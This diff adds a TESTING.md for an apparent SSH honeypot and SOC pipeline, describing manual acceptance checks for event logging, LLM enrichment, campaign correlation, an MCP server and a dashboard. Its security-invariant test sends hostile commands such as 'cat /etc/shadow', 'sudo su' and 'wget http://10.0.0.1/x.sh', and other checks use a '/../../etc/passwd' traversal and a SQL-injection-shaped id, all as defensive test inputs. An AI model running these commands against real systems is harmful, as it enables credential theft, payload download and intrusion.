@@ -1,0 +1,208 @@
+# TESTING.md
+
+How to verify each acceptance criterion by hand, with what a pass actually
+looks like. Written so you can tell a real pass from a script that exits 0
+without checking anything.
+
+Run everything at once:
+
+```bash
+npm run test:all
+```
+
+---
+
+## Quick reference
+
+| Command | Needs | Time | Proves |
+| --- | --- | --- | --- |
+| `npm test` | nothing | ~5s | 25 unit tests, LLM mocked |
+| `npm run typecheck` | nothing | ~5s | `tsc` clean |
+| `npm run test:mcp` | nothing | ~10s | Real MCP client handshake + tool calls |
+| `npm run test:mcp-robustness` | nothing | ~10s | 11 hostile inputs, no crash |
+| `npm run test:pipeline` | nothing | ~15s | Pipeline fails loudly without a key |
+| `npm run test:autoclose` | nothing | ~15s | Campaign auto-close persists |
+| `npm run verify:honeypot` | honeypot running | ~3s | No-execution invariant |
+
+---
+
+## FR1 — Honeypot records structured events
+
+```bash
+npm run keys          # once
+npm run honeypot      # terminal 1
+npx tsx scripts/probe-honeypot.ts   # terminal 2
+```
+
+**Pass:** the probe prints `auth accepted (honeypot accepts anything)`, and
+`data/events.jsonl` gains one line per session with `id`, `timestamp`,
+`sourceIp`, `sourcePort`, `usernameTried`, `passwordTried`,
+`commandsAttempted`, `sessionDurationMs`.
+
+**Fail:** file missing, or zero new lines.
+
+## Security invariant — commands are recorded, never executed
+
+This is the PRD's central claim, so verify it explicitly:
+
+```bash
+npm run honeypot      # terminal 1
+npm run verify:honeypot   # terminal 2
+```
+
+The script connects for real, runs `whoami`, `id`, `cat /etc/shadow`,
+`sudo su`, `touch /tmp/soc-verify-pwned`, and `wget http://10.0.0.1/x.sh`,
+then asserts:
+
+- `/tmp/soc-verify-pwned` was never created
+- `/tmp/evil.sh` was never created
+- the `wget` payload appears **verbatim** in the log
+- the server returned canned replies for all of it
+
+**Pass:** `HONEYPOT VERIFICATION: PASS`, exit 0.
+
+**Fail:** any `FAIL` line, exit 1.
+
+Check it yourself too:
+
+```bash
+ls /tmp/soc-verify-pwned 2>/dev/null && echo "BREACH" || echo "safe"
+grep -c wget data/events.jsonl
+```
+
+## FR2–3 — Normalizer validates and skips bad lines
+
+```bash
+printf '%s\n' \
+  'garbage' \
+  '{"id":"x","timestamp":"nope"' \
+  '{"id":"y"}' > /tmp/bad.jsonl
+npx tsx -e "import {readEvents} from './src/mastra/normalizer'; readEvents('/tmp/bad.jsonl').then(e=>console.log('parsed:',e.length))"
+```
+
+**Pass:** `parsed: 0`, with `[normalizer] skipped ...` warnings on stderr. One
+corrupt line must never take out the valid lines around it — the unit test
+`recovers valid events around truncated, binary and junk lines` proves a good
+event either side of three different kinds of corruption still parses.
+
+## FR4 — LLM triage and geo/ASN enrichment
+
+Needs a real key in `.env` (`AIza…`).
+
+```bash
+npm run honeypot &      # capture something first
+npx tsx scripts/probe-honeypot.ts
+npm run pipeline
+```
+
+**Pass:** `Enriched N/N event(s)` with N > 0, and `data/enriched.jsonl`
+containing `classification`, `severity` 1–5, `country`, `asn`.
+
+**Without a key** the pipeline must fail, not pretend:
+
+```bash
+env -u GOOGLE_GENERATIVE_AI_API_KEY npm run pipeline; echo "exit: $?"
+```
+
+**Pass:** `PIPELINE FAILED: no events were enriched.` and `exit: 1`. If you see
+`exit: 0` with zero enriched events, that bug is back.
+
+## FR5 — Correlation
+
+```bash
+npm run seed && npm run correlate
+```
+
+**Pass:** lines like `198.51.100.23 … -> campaign xxxxxxxx (6 events, max sev 5)`,
+then `15 campaign(s) stored`. Six events from one IP inside the 30-minute
+window must collapse into **one** campaign.
+
+`npm run test:autoclose` additionally proves a campaign past its idle window
+transitions to `closed` and that a *separate process* reads that back.
+
+## FR6 — Reports
+
+**Pass:** `reports/campaign-*.md` exists for any campaign at severity ≥ 4 or
+with ≥ 5 events. Re-running `npm run correlate` refreshes the same file rather
+than creating a duplicate.
+
+Read `examples/example-report.md` for a committed example.
+
+## FR7 — MCP server
+
+**The in-process test is not enough.** It passed once while no MCP client could
+connect at all, which is why the wire test exists:
+
+```bash
+npm run test:mcp
+```
+
+**Pass:** a real client completes the handshake, lists exactly
+`get_recent_campaigns`, `get_campaign_detail`, `ask_soc_agent`, and calls two of
+them against a seeded store. Look for `MCP WIRE TEST: PASS`.
+
+Handy for poking at it yourself:
+
+```bash
+npm run mcp      # stdio; then use any MCP client, e.g. Claude Desktop
+```
+
+> **Version constraint.** Pinned to `@mastra/mcp@1.18.0` + MCP client SDK 1.x.
+> `@mastra/mcp@2.x` depends on a server SDK that speaks only protocol
+> `2026-07-28`, which **no published MCP client supports** — upgrading breaks
+> every real client. Do not bump it without re-running `npm run test:mcp`.
+
+Malformed input:
+
+```bash
+npm run test:mcp-robustness
+```
+
+**Pass:** 11 assertions, including a SQL-injection-shaped id (returns
+`{"found": false}`, does not execute) and wrong-typed arguments (clean
+validation error, no crash).
+
+## FR8 — Dashboard
+
+```bash
+npm run dashboard
+```
+
+| Route | Expect |
+| --- | --- |
+| `/` | Landing page (after `npm run setup`) |
+| `/dashboard` | SOC console with KPIs, severity chart, campaigns |
+| `/enriched.jsonl` | Raw events feeding both |
+| `/assets/*` | Hashed JS/CSS |
+
+**Pass:** all 200. Path traversal (`/../../etc/passwd`) must return **404**.
+
+If `/` shows "The landing page has not been built", run `npm run setup`.
+
+## Determinism
+
+Correlation and reporting never call an LLM. With the same input file you get
+byte-identical output, so:
+
+```bash
+npm run seed && npm run correlate && md5 reports/*.md
+```
+
+Re-run and compare. Gemini quota cannot affect this.
+
+---
+
+## Fresh-clone check
+
+```bash
+git clone https://github.com/0xsan7/Honeypot.git honeypot-test
+cd honeypot-test
+npm install
+cp .env.example .env
+npm run setup
+npm run dashboard
+```
+
+Takes well under two minutes on a warm cache. If any step above needed a
+command this file does not mention, that is a bug in the docs — please open an
+issue.
